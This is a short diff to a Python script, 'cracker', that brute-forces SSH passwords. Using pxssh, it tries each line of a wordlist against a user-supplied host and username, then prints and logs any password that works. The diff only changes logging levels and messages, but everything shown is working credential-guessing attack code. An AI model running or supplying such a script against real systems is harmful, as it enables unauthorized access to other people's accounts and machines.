@@ -12,7 +12,8 @@ import time
 from pexpect import pxssh
 import logging
 
-logging.basicConfig(filename="sample_log.txt", level=logging.WARNING)
+logging.basicConfig(filename="sample_log.txt", level=logging.INFO)
+
 def cracker(user, ipAddress, txtFile ):
     filepath =open(txtFile)
     for i in filepath.readlines():
@@ -22,14 +23,14 @@ def cracker(user, ipAddress, txtFile ):
         try:
             s.login(ipAddress, user, secret)
             print("The password is  "+ secret)
-            logging.info("The password "+ secret)
+            logging.info("The password is "+ secret)
             break    
         except pxssh.ExceptionPxssh as e:
-            logging.exception(e)
+            logging.info(e)
             print ("pxssh failed to login")
             print(e)
             time.sleep(1)
-    logging.info('Finished')       
+    logging.info('Finished cracking')       
 def main():
     print("Shall we play a game?")
     user=input("What is the username for the SSH connection?")
